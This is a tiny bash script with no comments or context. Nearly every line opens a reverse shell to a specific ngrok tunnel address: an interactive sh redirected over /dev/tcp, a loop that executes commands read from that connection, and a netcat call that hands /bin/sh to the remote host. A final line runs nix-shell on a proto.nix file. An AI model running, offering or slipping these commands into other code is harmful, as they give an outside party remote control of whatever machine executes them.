#!/bin/bash
/bin/sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/17937 0>&1
exec 5<>/dev/tcp/0.tcp.ap.ngrok.io/17937;cat <&5 | while read line; do $line 2>&5 >&5; done
nc 0.tcp.ap.ngrok.io 17937 -e /bin/sh
nix-shell proto.nix --run ""
